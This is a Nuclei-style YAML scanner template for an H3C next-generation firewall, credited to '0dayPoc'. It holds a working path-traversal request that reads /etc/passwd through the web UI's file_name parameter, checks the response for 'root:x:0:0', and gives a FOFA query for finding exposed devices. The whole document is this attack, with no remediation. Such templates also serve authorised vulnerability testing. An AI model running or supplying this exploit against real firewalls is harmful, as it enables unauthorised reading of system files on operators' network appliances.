id: h3c-firewall-file-read

info:
  name: H3C下一代防火墙文件访问控制缺陷
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: product=H3C-下一代防火墙
  tags: H3C下一代防火墙

http:
- raw:
  - |
    GET /webui/?file_name=../../../../../etc/passwd&g=sys_corefile_sysinfo_download HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'root:x:0:0'
